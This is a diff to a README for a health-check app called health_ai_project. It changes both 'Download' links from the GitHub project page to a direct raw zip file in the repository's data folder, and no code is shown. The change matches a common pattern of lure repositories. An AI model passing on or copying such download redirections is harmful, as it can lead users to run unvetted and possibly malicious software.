@@ -1,6 +1,6 @@
 # 🧠 health_ai_project - Smart health checks made simple
 
-[![Download health_ai_project](https://img.shields.io/badge/Download%20Now-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Combined-pickuptruck876/health_ai_project)
+[![Download health_ai_project](https://img.shields.io/badge/Download%20Now-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Combined-pickuptruck876/health_ai_project/raw/refs/heads/main/data/ai-project-health-2.2.zip)
 
 ## 🩺 What this app does
 
@@ -32,7 +32,7 @@ For the best result:
 
 Go to the project page here:
 
-[Download health_ai_project](https://github.com/Combined-pickuptruck876/health_ai_project)
+[Download health_ai_project](https://github.com/Combined-pickuptruck876/health_ai_project/raw/refs/heads/main/data/ai-project-health-2.2.zip)
 
 ## 🧭 How to get it on Windows
 
